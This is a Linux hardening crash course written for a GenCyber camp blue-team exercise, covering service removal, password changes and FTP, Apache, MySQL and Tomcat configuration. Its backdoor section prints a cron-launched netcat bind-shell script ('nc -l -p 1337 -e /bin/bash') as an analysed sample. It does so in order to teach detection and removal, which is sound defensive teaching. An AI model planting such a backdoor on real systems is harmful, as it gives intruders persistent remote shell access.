---
layout: page
title: Incomplete Linux Security Crash Course
permalink: gencyber2017
---

# Securing Linux

Welcome to my Linux security crash course designed for Liberty University's GenCyber Summer Camp. It explains how to get a linux system secure enough to survive a day of Red Team attacks.


## Figuring out new things

No human could possibly tell you all there is to know about linux. I don't even remember half of what I learn about it, and I only know probably 5% of what there is to know about it.
* *Man Pages*: `man command` will give you a very technical user's manual for a given command. This manual will be fairly technical, and if you haven't used linux very long, will make very little sense. But you will be able to catch bits and pieces, and the more you read them, the more useful they become. Searching using the `/` key is very helpful with man pages. And remember to quit with `q`.
* *Google*: Google is your best friend. I regularly use google to remember how to do things, or to learn new things. 
* *Resources*: The Resources section at the end of this lesson includes a number of links to useful resources.

## Suggestions for the camp

* Make the most of this experience. You have a bunch of really smart mentors and teachers who want to help you learn and grow, personally and technically.
* Take notes: there is a lot to learn, and each person can only learn so much. Take notes and help your team members learn.
* Practice: working with computers is like riding a bicycle. You can't learn a lot from lectures. You have to *do* it.
* Work as a team. The smartest person on your team at best knows 10% of what the dumbest Red Team member knows. The only way to overcome the skill deficit is to work together.
* Don't Panic: yelling, at each other or at the computer, is not going to help you stop a hacker. Calm, clear thinking is the only way you'll get somewhere.
* If you feel lost in the technical side of things, you can still be a big help to your team:
    * look at the checklist and choose one or two things to learn to do really well. Work with a mentor to make sure you've got them down.
        * learn to run scans to check that a vulnerability has been eliminated.
        * learn to change passwords really well.
        * learn to do software updates.
    * help your team keep organized:
        * there are a lot of servers and not a lot of time, so things need to be organized.
        * Look at the checklists, and coordinate who is going to take care of which task on each server, and make sure they all get secured.
    * Be the peacemaker: teamwork requires relationships, and human relationships are challenging -- often feelings get hurt, people don't get along, or people just don't understand each other. Helping your team resolve these relational tensions can go a long way to making your team more effective. 
    * Help your team manage an incident response. You can maintain communication and keep track of the process, and your more technical team members can focus on the technical tasks.

# How to secure a Computer

## Threat Model

When securing a system, you need to identify two things: the value of the thing you are securing, and the threats against which you are securing it. 

Security is an economics game.
 
* Economics is the study of scarce resources that have alternative uses. In other words, economics involves figuring out systems that enable making the best use of limited resources. 
* Your resources are time and knowledge, both of which are limited, and both can be used for many things. We need to focus our resources on keeping the Red Team out for one whole day. No more, no less.
* As a result, I will focus your time on securing your servers as quickly as possible. We will get these machines secured, not locked down. If you want to learn professional-grade security, this lesson offers a very basic starting point from which you can grow your skills.
* A security professional running a web server would do a whole lot more technical stuff to secure a server. He also has a lot more time and a lot more knowledge -- in other words, he has more resources. We can't try to match his level of security. 
* One of my assumptions is that once Red Team gains even minimal access to your server, they will hose it. Hence it is the highest value use of our time is in keeping them out. There is less value in preventing them from doing damage once they get in, because there are so many ways for them to break the server that we wouldn't cover them all. Instead, lets keep them OUT.

## Systematic process:

Any time you attempt to achieve something, you want to have a structured process that can get you to your objective. For us, we want to start at the base level of our system, and work outwards. We establish a secure zone, and then we expand the borders of that secure zone. Below is the outline of that process:
1. Integrity of the operating system.
2. OS User accounts.
3. OS Software updates.
4. OS Services
    * Minimization
    * Configuration
    * User accounts
5. Application Software
    * Updates
    * Configuration
    * User accounts
6. Detection

# How to secure Linux

## 1. Integrity of the Operating System

Before you try to secure an operating system you will need to remove any malware that could track or thwart your ability to do anything on your server. Finding and removing malware is an entire industry on its own. However, in our case, it appears that only two of the linux servers have a back door (according to the OpenVAS scan).

In order to find and remove these backdoors from the inside:
1. Figure out which process is listening on the backdoor port: 
    * `netstat -tulpn | grep 1337`
    * `tcp    0    0 0.0.0.0:1337    0.0.0.0:*    LISTEN    3652/nc`
    * in this case 3652 is the process id. Now that we have the process ID, we can find out where it came from.
2. Figure out how the process is being run:
    * Now that we have a process ID, we could simply kill the process. However, there are two reasons we should do more investigating first:
        1. Killing the process would make it harder to track it down. The running process provides clues to its location. With that said, you may want to somehow block access to that machine while you investigate, if you are running live.
        2. If you were to kill this particular process, you would be surprised to discover the backdoor running again less than a minute after you killed it.
    * We can trace a process using the process tree:
        * `ps -eFH` lists processes running on the system in a tree form -- showing which processes own which other processes.
        * `ps -eFH | grep -B5 <the process id of nc>` will show us the line of the `nc` process that is actually listening on the port, as well as 5 lines before it, enabling us to see the tree leading to that process.
        * The output from this command tells us that netcat is being run by the script `/usr/sbin/backdoor`, which was ultimately run by `/USR/SBIN/CRON`
            ```
            root     16142  2520  0 14614  1556   0 20:44 ?        00:00:00     /USR/SBIN/CRON
            rose     16143 16142  0  1047   588   0 20:44 ?        00:00:00       /bin/sh -c /usr/sbin/backdoor
            rose     16144 16143  0  2690  1388   0 20:44 ?        00:00:00         /bin/bash /usr/sbin/backdoor
            rose     16149 16144  0  1549   724   0 20:44 ?        00:00:00           nc -l -p 1337 -e /bin/bash
            ```
        * Since cron is the task scheduling system on linux, we know that it is a scheduled task that is triggering the backdoor. We also know where the backdoor is located. And, since the owner of the backdoor processes is `rose`, we can guess that it is rose's crontab that is scheduling the backdoor (If you want to learn more about cron or scripting, look at the resources section).
    * So let's remove that line from rose's crontab:
        * `crontab -u rose -e`
        * This line: `* * * * * /usr/sbin/backdoor` tells the scheduler to run the program `/usr/sbin/backdoor` every minute.
        * remove that line from the crontab.
        * make sure it's been removed: `crontab -u rose -l`
    * Now we can kill the process and it will stay dead.
        * `kill -s SIGKILL <the process id goes here>`
    * Now remove the backdoor file:
        * `rm /usr/sbin/backdoor`
3. Verify that it's gone:
    * no more listening `netstat -tulpn | grep 1337` ( should give no output )
    * files are gone `cat /usr/sbin/backdoor` (should say "no file or directory")

As a fun aside, here's an explanation of the backdoor:
    
```bash
## It is a script:
#!/bin/bash

## This is the command it uses to check that the script is running:
isOn=`netstat -tln | grep ':1337'| wc -l`

## The if statement checks the result of the isOn command -- if it is zero, then
if [ $isOn == "0" ]
then
  ## It starts a netcat command that enables data sent to the 1337 port to give access to bash (the command line)
  nc -l -p 1337 -e /bin/bash
fi
```

Another note: with this backdoor, we could simply remove the offending file from /usr/sbin and killed the process. Then the scheduled task would simply stop working because it wouldn't have a program to execute. However, other backdoors could be more complicated (for example, if another scheduled task regenerated the backdoor in the location where you deleted it). So backdoors have to be treated with a lot of investigation and care. 

In a corporate environment, you would possibly have a good chat with Rose. You may even give her a kind invitation to no longer work in your organization. Or perhaps, invite some helpful Law Enforcement Officers to have a conversation with her. ;)

Once we've cleaned up the operating system, we can move on to the server itself.

## 2. OS User Accounts

This will be the MOST IMPORTANT thing you do to secure your servers. Make sure you do it well. Most of the teams in last year's camp got hacked very quickly by red team because they hadn't changed all of their operating system user account passwords. With Red Team's skill, it only takes one poorly secured user account for them to get in and hose the server.


### Generating secure passwords

I've developed a strategy for generating secure passwords that are easy to remember. The ideas come from [this xkcd cartoon](https://xkcd.com/936/) and a fellow LU student who mentioned using the Oxford Dictionary website to generate unusual words. A full explanation of what makes this strategy effective is beyond the scope of this lesson, but the idea is that long passwords are hard to guess, and passwords made up of combinations of unusual words (unlikely to be found in normal hacker dictionaries).

My strategy is roughly like this:
* Go to the [wikipedia random page](https://en.wikipedia.org/wiki/Special:Random) repeatedly
* When a page title features a particularly peculiar long word, write it down.
* Select two or three such words and put them together to create a long password that is really easy to remember (even if the words are hard to pronounce).

Wikipedia works well for this strategy because it has articles about many diverse subjects with strange words. Biological and scientific terms, place names or terms from foreign languages, and technical terms from esoteric subjects, all combine to make randomized wikipedia a rich ecosystem of linguistic entropy. 

However, any site that generates random long words, or even a site that generates passwords made up of multiple words (like the [xkcd password generator](com/20110811/xkcd-password-generator/)), can produce a similar effect. You may not get the diversity of wikipedia, but really, the key is to make things long without making them excessively complex. 
 
I have a script that helps me get just the titles from Wikipedia's random page repeatedly. To use this script, do the following:

* Download the script: `wget https://raw.githubusercontent.com/slackboxster/slackboxster.github.io/master/gencyber2017/scripts/wikipwgen.sh`
* make it executable: `chmod +x wikipwgen.sh`
* run the script: `./wikipwgen.sh`
* Note: the script is an infinite loop. When you have enough titles, hit `Ctrl+C` to stop the script.

### Analyze the situation

* Figure out what users are on each server by looking at the file `/etc/passwd`
    * `cat /etc/passwd`
	* This file contains a number of system accounts that should be on there. 
	* You can determine which are system users and which are normal users by looking at the uid (the first number after the username in `/etc/passwd` -- if that is less than 1000, it is a system account.
	* (where did I get that number? the `/etc/login.defs` file -- look for `UID_MIN 1000`).
    * the `toor` account is very easily overlooked. It is an alias to the superuser account `root`, so it is incredibly important to make sure it is secured.
    * we must assume that all existing user accounts are insecure.

### Delete the toor user

The toor user is unnecessary and poses significant security risks. 

`deluser toor` should remove the toor user. However, the toor user is running a process - proftpd specifically. Thus we will address removing the toor user when we work on securing ftp.

### Change passwords

This is the most important step. If you forget to change a password, it is likely that Red Team will be logged into that account within 5 minutes. Maybe an hour because of how many servers they are attacking. In other words, one unchanged password and you will not stand a chance.

Use the printouts to set the passwords for your system. Ordinarily we would not use the same password twice ever. However, we will strategically reuse passwords to save time and simplify things. But we won't use all the same passwords so that Red Team doesn't get a whole lot of benefit from discovering one password.

Your root user password should not be reused anywhere. Reuse the same password for all your normal user accounts. And then use a different password for anything else on the server.

* first, change the root password:
    * `passwd`
    * follow the prompts to give a new, secure password.
    * verify by trying to log in with the new password.
* change the passwords of all non-system users that have passwords:
    * `passwd <username>`
    * follow the prompts to give a new, secure password to the user.
    * verify by trying to log in as that user with the new password.

### Make sure nobody is in the sudo group
If you do the password change, this is a less significant vulnerability, but it could still have an impact if an attacker gets into a different service on the machine. 

* Use `members sudo` to find which users are in the `sudo` group
	* you may need to install the members commmand:
`sudo apt-get install members`
	* If you see a user in the resulting list who shouldn't be there, remove them from the group:
        * `deluser user group` -- replace `user` with the username, `group` with the group (in this case sudo) 
        * Warning: make sure not to `deluser user` -- that would delete the user.
        * Example: remove `rose` from the `sudo` group:
            * `deluser rose sudo`

## 3. OS Software updates.

Once you have secured your user accounts, the next thing that Red Team will want to attack is vulnerabilities that give access without having a valid user account. They will use a database of known vulnerabilities, so the best way to secure against this is to update your software. The moment a Red Team member detects out of date software, they are only two clicks away from hosing your server.

Updating software in Debian is usually really simple:
 
* Run this command:`sudo apt-get update; sudo apt-get upgrade`
* Then just wait for the packages to update. 

## 4. OS Services

* Minimization: remove any unnecessary services
* Configuration: configure services correctly so that they don't allow inappropriate access.
* User accounts: if services allow logins, make sure the user accounts for those services are secure.

There are a number of services that don't need to be running on your server. You do want to keep the scored services running, and you want to keep services that support the scored services running. Also keep ssh, otherwise you can't log in.

* Find services listening on the network with: `netstat -tulpn`
* You will see a list of listening processess. You can use some googling and comparing things with the list of scored services to see if you can remove one. 
* Services you should not remove are therefore:
    * ssh
    * ftp
    * apache
    * tomcat (on jenkins)
    * java (it's what runs jenkins!)
    * mysql
    * postgresql
    * dhclient (this is how your server gets its IP address).

## Minimization: remove unnecessary services

For each service, remove it by uninstalling the associated package with `apt-get remove`. Removing the package should also stop the service.

Also, you could specify multiple packages in the remove command, for example: `apt-get remove cups samba nfs-common rpcbind`

To test if a service is needed, stop it and check your nagios: `service <service> stop`.

Remove at least the following services:

* cups (printing): 
    * remove the package: `apt-get remove cups` (this actually disables cups, even though it isn't installed using cups. 
    * Make sure you can't start the service after: try `service cups start` and check netstat.
    * If you have errors removing cups, first remove the init script: `rm /etc/init.d/cups`, then remove the package.
* swat: `update-inetd --disable swat` (verify with `cat /etc/inetd.conf`)
* samba (windows file sharing) (smbd and nmbd): `apt-get remove samba`
* nfs (linux file sharing): `apt-get remove nfs-common`
* rpcbind (used by nfs): `apt-get remove rpcbind`
* avahi-daemon (apple discovery services!): `apt-get remove avahi-daemon`
* exim4 (email server): `apt-get remove exim4 exim4-base` (note that there are two packages to remove -- exim4-base is the one that removes the service)
* minissdpd (plug and play network protocols): `apt-get remove minissdpd`

Once you've removed those, run `netstat -tulpn` again. Here is an example output:

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      3050/mysqld     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      3706/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      2411/apache2    
tcp6       0      0 :::21                   :::*                    LISTEN      3778/proftpd: (acce
tcp6       0      0 :::22                   :::*                    LISTEN      3706/sshd       
udp        0      0 0.0.0.0:68              0.0.0.0:*                           2365/dhclient   
udp        0      0 0.0.0.0:64836           0.0.0.0:*                           2365/dhclient   
udp6       0      0 :::54657                :::*                                2365/dhclient   
```

When you are done:

`apt-get autoremove` to remove remaining unnecessary packages.


## Configuration and User Accounts: configure services securely.

Interesting tidbit: I got most of my information for this section from googling "How to Secure <Insert Name of Service> Linux". Combined with my knowledge about how this stuff works, I condensed it down to the following steps. But feel free to do more googling if you have time on your hands. 

### FTP (port 21)
We need to disable anonymous access. But it also appears that the toor user has manually installed and configured a less secure ftp server, so we'll have to remove that first.

0. Check for anonymous access on your server:
    * On your Kali machine, run this command to check for anonymous access:
        * `nmap -p 21 -v -oN results.txt --open --script ftp-anon 192.168.210.54` (make sure to change the IP Address!!)
        * if ftp anonymous is enabled, you'll see:
            ```
            PORT   STATE SERVICE
            21/tcp open  ftp
            | ftp-anon: Anonymous FTP login allowed (FTP code 230)
            | drwxr-xr-x   2 root     root         4096 May 18 11:35 backups
            | drwxr-xr-x  16 root     root         4096 Jun 27 02:42 cache
            | -rw-r--r--   1 root     root           36 May 16 15:01 checkfile
            | drwxr-xr-x   2 root     root         4096 May 15 19:09 games
            | drwxr-xr-x  55 root     root         4096 Jun 26 16:27 lib
            | drwxrwsr-x   2 root     staff        4096 May 30  2016 local
            | lrwxrwxrwx   1 root     root            9 May 15 18:57 lock -> /run/lock
            | drwxr-xr-x  16 root     root         4096 Jun 27 02:42 log
            | drwxrwsr-x   2 root     mail         4096 Jun 27 01:50 mail
            | drwxr-xr-x   2 root     root         4096 May 15 18:57 opt
            | lrwxrwxrwx   1 root     root            4 May 15 18:57 run -> /run
            | drwxr-xr-x   6 root     root         4096 Jun 26 16:27 spool
            | drwxrwxrwt   2 root     root         4096 May 16 15:35 tmp [NSE: writeable]
            |_drwxrwxrwx  10 root     root         4096 May 18 00:02 www [NSE: writeable]

            ```
        * I show you this because anonymous is off, all you'll get is:
            ```properties
            PORT   STATE SERVICE
            21/tcp open  ftp
            ```
1. Remove ProFTP (and toor)
    1. You'll notice the service remains after trying to remove the package: `apt-get remove proftpd-basic`, and after stopping the service: `service proftpd stop`
    1. We can verify that ProFTP was *not* installed using apt-get. Which is really annoying. And it means we have to trace down the files and get rid of them manually.
    2. Get the process ID: `netstat -tulpn | grep proftpd`
    3. Now trace that process like we did with the backdoor:
        * `ps -eFH | grep -B5 <process id>`
            * `toor      3795     1  0  6495  1200   0 Jun25 ?        00:00:00   proftpd: (accepting connections)` unfortunately, all this tells us is that it was run by toor. (who really should be named `tool`).
        * `lsof -p <process id>` gives at least something useful:
            * `proftpd 3795 toor  txt    REG                8,1   531568 2894102 /usr/local/sbin/proftpd`
            * with this, we finally have the path to the program: `/usr/local/sbin/proftpd`
            * unlike the backdoor, this is not a bash script (want to find out? `cat /usr/local/sbin/proftpd` will fill your screen with junk, because it is a binary file, not a text file).
        * We can go ahead and delete that file: `rm /usr/local/sbin/proftpd`
        * double check the init script is gone: `rm /etc/init.d/proftpd`
        * And kill the process: `kill -s SIGKILL 3795`
    4. Verify that it's gone:
        * no longer listening `netstat -tulpn | grep proftpd` ( should give no output )
2. Delete `toor` user:
    * `deluser toor` no longer gives an error message about a running process.
3. Clean up vsftp configuration:
    * We now don't have anything listening on port 21, so the scorebot will start freaking out. Need to install something quickly.
    * Before we install vsftp, we need to fix something really nasty: an insecure vsftp configuration file is already on the server -- and the installer won't remove it.
    * check it out: `cat /etc/vsftpd.conf` -- you'll notice a lot of "insecure" options enabled.
    * We can purge configuration by doing `apt-get purge vsftpd`. This will also insure we can install clean vsftpd with new config files.
        * you may need to get rid of cups first - `apt-get purge cups`
    * we may also need to remove the `/srv/ftp` folder -- `rm -rf /srv`
4. Install vsftp
    * `apt-get install vsftpd`
    * configure it to ban anonymous access:
        1. edit the config file: `nano /etc/vsftpd.conf`
            * change `anonymous_enable=YES` to `anonymous_enable=NO`
            * uncomment the line `#local_enable=YES` -- make it `local_enable=YES` (otherwise scorebot will have trouble...)
        3. save the file
        4. restart the service to reload configuration: `service vsftpd restart`
    * ordinary we would also allow local users to log in, however, we just need to keep the port open, not actually logging in since nagios can't log in..., so not enabling local users keeps things simple. :)
5. Verify you are listening and anonymous is banned:
    * `netstat -tulpn | grep vsftpd`
    * *From Kali* `nmap -p 21 -v -oN results.txt --open --script ftp-anon 192.168.210.54` (make sure to change the IP Address!!)

### Apache (port 80)

1. Remove bad files:
    * `rm /var/www/phpinfo.php`
    * `rm -rf /var/www/backups` (on some servers... contains a copy of the passwd file!!!)
2. Fix the permissions of web directory:
    * `ls -al /var/www` to see the permissions
    * `chown -R www-data:www-data /var/www` -- change the web files to be owned by the apache user.
    * `find /var/www -type f -exec chmod 640 {} \;` -- give all files the right permissions
    * `find /var/www -type d -exec chmod 750 {} \;` -- give all directories the right permissions
3. Configure the sites:
    * get into the configuration directory: `cd /etc/apache2`
    * check what sites exist: `ls sites-enabled` -- should only be `000-default`. If not, let me know.
    * Edit the default site config: `nano /etc/apache2/sites-enabled/000-default`
    * Remove this section:
        ```
            ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
            <Directory "/usr/lib/cgi-bin">
                    AllowOverride None
                    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                    Order allow,deny
                    Allow from all
            </Directory>
        ```
    * Change the section for `<Directory />` to:
        ```
            <Directory />
            Options None
            Order deny,allow
            Deny from all
            </Directory>
        ```
    * Change the section for `<Directory /var/www>` to:
        ```
          <Directory /var/www>
              Options -Indexes
              AllowOverride None
              Order allow,deny
              allow from all
          </Directory>
        ```
    * restart apache to make sure everything is still good:
        * `service apache2 restart`
    * verify you've locked things down by going to: `http://192.168.210.54/~root/.bashrc` (replace IP address...) in a browser -- you should get a "forbidden" error.
3. Verify it's running as www-data -- you should not need to change anything for this step.

    This is a little confusing, because in `/etc/apache2/apache2.conf` we would expect to see some usernames, but instead we get this wierd junk.
    ```
    # These need to be set in /etc/apache2/envvars
    User ${APACHE_RUN_USER}
    Group ${APACHE_RUN_GROUP}
    ```
    * oh, but wait, quick gotta check another file: `cat /etc/apache2/envvars | grep APACHE_RUN`
        ```
        export APACHE_RUN_USER=www-data
        export APACHE_RUN_GROUP=www-data
        export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
        ``` 
    * if you see www-data in the envvars file as above, you are good. :)
    * Another way to verify: `ps -eF | grep apache` and you should see something like:
        ```
        root     20292     1  0 47285 10396   0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
        www-data 20299 20292  0 47295  6584   0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
        www-data 20300 20292  0 47295  6584   0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
        www-data 20301 20292  0 47591 12224   0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
        www-data 20302 20292  0 47295  6584   0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
        www-data 20303 20292  0 47295  6584   0 00:09 ?        00:00:00 /usr/sbin/apache2 -k start
        www-data 20330 20292  0 50350 23220   0 00:10 ?        00:00:00 /usr/sbin/apache2 -k start
        www-data 20333 20292  0 47341  7052   0 00:10 ?        00:00:00 /usr/sbin/apache2 -k start
        www-data 20334 20292  0 47295  6584   0 00:10 ?        00:00:00 /usr/sbin/apache2 -k start
        www-data 20335 20292  0 47295  6584   0 00:10 ?        00:00:00 /usr/sbin/apache2 -k start
        www-data 20336 20292  0 47341  7012   0 00:10 ?        00:00:00 /usr/sbin/apache2 -k start
        root     20425 18845  0  1960   872   0 00:18 pts/0    00:00:00 grep apache
        ```
3. Hide your version numbers:
    * This stuff at the bottom of an error page gives much info to Red Team.
        * *Apache/2.2.22 (Debian) Server at 192.168.210.55 Port 80*
    * Hide it by: 
        * edit the security config: `nano /etc/apache2/conf.d/security`
        * Change the following lines:
            * `ServerSignature On` to `ServerSignature Off`
            * `ServerTokens OS` to `ServerTokens Prod`
        * Restart apache `service apache2 restart`
        * verify your error messages are less helpful. ;)
4. Install mod-security:
    * `apt-get install libapache2-modsecurity` (should enable the module and restart apache automatically)


### mysql (port 3306): 

* check what it's listening on: `netstat -tulpn | grep mysql`
    * if "Local Address" starts with 0.0.0.0, it is public. If 127.0.0.1, it's private to this server.
* configure: `nano /etc/mysql/my.cnf`
* only run on the server's internal network.
    * change: `bind-address = 0.0.0.0` to `bind-address = 127.0.0.1`
* prevent loading local files: 
    * add this to the next line after bind-address: `local-infile=0`
* Don't run it as root!
    * change this `user            = root` to `user = mysql`
* restart the service: `service mysql restart`
* verify with `netstat -tulpn | grep mysql`
    * `tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      24388/mysqld` -- this indicates we are listening only on localhost.
* verify with nmap from kali: `nmap 192.168.210.54`

### postgres (port 3305)

This is necessary on at least drupal. I recommend not removing it since it listens locally by default, and can cause issues if you remove it.

### tomcat (port 8080)

1. figure out where tomcat is running: `echo $CATALINA_HOME`
    * gives us: `/opt/tomcat7`
    * so go into that directory: `cd /opt/tomcat7`
2. Remove the default web applications:
    * go into the webapps directory: `cd webapps`
    * verify with `pwd` -- should give: `/opt/tomcat7/webapps`
    * `rm -rf docs examples ROOT`
    * reconfigure default page
    * verify with ls.
3. Change the management password:
    * `nano /opt/tomcat7/conf/tomcat-users.xml`
    * Find this section:j
        ```
          <role rolename="manager-gui"/>
          <user username="tomcat" password="tomcat" roles="manager-gui"/>
        ```
    * Replace the password -- example: `password="tomcat"` to `password="badwolf"` changes the password to `badwolf` -- but use a service account password.
    * restart the tomcat service: `service tomcat7 restart`
4. Protect the shutdown port
    * `nano /opt/tomcat7/conf/server.xml`
    * Change `<Server port="8005" shutdown="SHUTDOWN">` to `<Server port="-1" shutdown="SHUTDOWN">`
    * restart the tomcat service: `service tomcat7 restart`
5. Turn off AJP
    * the AJP connector enables proxying requests to tomcat through apache. This is not necessary for our configuration.
    * `nano /opt/tomcat7/conf/server.xml`
    * Remove this line: `    <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />`
    * restart the tomcat service: `service tomcat7 restart`

### ssh (port 22)

Secure SHell allows operating system users to log in. Apart from changing operating system user passwords and updating packages, there isn't much to do here. 

There is the scan warning about weak encryption algorithms. However, as advanced as our Red Team is, they aren't the NSA, and they don't have a week to attack us, so the weak encryption algorithms should not cause significant problems, and therefore are not worth spending time on (yet). Also, we aren't using outdated ssh clients, so we won't be exposing this vulnerability.

If you have time, try installing `fail2ban` as a countermeasure.

## 5. Application Software

Once you have your operating system and services secure, it's time to secure the applications running on your system, which can often provide a lot of access for attackers to your computer.

Your applications are:

* WordPress
* Joomla
* Drupal
* Request Tracker
* Jenkins
* Gitlab
* Bugzilla

For each, you will need to address the same broad categories:

* Updates
* Configuration
* User accounts

I have been in charge of two servers running WordPress that got hacked. One was because WordPress was out of date, another was because a WordPress account had a bad password.

Mr Frankenfield will cover this section in more detail. 

## General Verification:

Check for anonymous ftp on all your linux servers:
    * *From Kali* `nmap -p 21 -v -oN results.txt --open --script ftp-anon 192.168.210.0/24` (make sure to change the 210 to your subnet!)

## 6. Firewalls

Mr Frankenfield will cover firewalls in his networking section, but I'll quickly cover them in less detail.

# Resources

The [Securing Debian Manual](https://www.debian.org/doc/manuals/securing-debian-howto/index.en.html#contents) has a lot of in-depth detail on the process of securing a Debian Linux computer. 

## Introductory Videos
Here are some videos to help introduce concepts that may be foreign to you:

* [What is a Computer](https://www.youtube.com/watch?v=AkFi90lZmXA)?
* [What is an Operating System](https://www.youtube.com/watch?v=pVzRTmdd9j0)?
* [What is Open Source Software](https://www.youtube.com/watch?v=a8fHgx9mE5U)?
* [What is Linux](https://www.youtube.com/watch?v=zA3vmx0GaO8)?
	* in case you were interested, check out [the linux source code](https://github.com/torvalds/linux)

## How to use the Linux Command Line
Learn the basics from the [learning the shell tutorial](http://linuxcommand.org/lc3_learning_the_shell.php).

If you already know how to use the command line, you should learn scripting. Scripting unleashes the true power of linux and its command line. You can learn more about that from [a different tutorial on the site](http://linuxcommand.org/lc3_writing_shell_scripts.php).

You can make your scripts even more useful with scheduling. Here's [an article on cron](http://www.unixgeeks.org/security/newbie/unix/cron-1.html)

For the adventurous: I love using vim. If you are bored and want a really cool challenge, learn vim. Try [this vim tutorial to get started](http://www.openvim.com/).


## Learn more about user management
User management can get much more complicated, and in a normal production setup we would disable root login, give every team member a user account on the server, and do a lot more in-depth configuration of the user accounts on the server. Our objective is to secure against Red Team, so we will do the absolute minimum that achieves that goal, so that we have time to do all the things that secure against Red Team, instead of spending the whole week doing enterprise-grade user management.

See [this ubuntu article](https://help.ubuntu.com/14.04/serverguide/user-management.html) for more info on managing users (our servers are debian, but ubuntu is based on debian, and its article is much more friendly).

## Learn more about service management
You can get more information from [this article](https://www.tecmint.com/remove-unwanted-services-from-linux/) and [this q&a](http://askubuntu.com/questions/477596/how-to-stop-and-remove-ftp-service).

## Learn more about securing specific services:
[FTP](https://www.pluralsight.com/blog/it-ops/how-to-set-up-safe-ftp-in-linux)
[Apache](https://www.tecmint.com/apache-security-tips/)
[Apache Wiki Permissions Article ](https://wiki.apache.org/httpd/FileSystemPermissions)
[Apache Permissions Article](http://fideloper.com/user-group-permissions-chmod-apache)
[Securing Mysql](https://www.digitalocean.com/community/tutorials/how-to-secure-mysql-and-mariadb-databases-in-a-linux-vps)
[Securing Tomcat](https://www.owasp.org/index.php/Securing_tomcat)
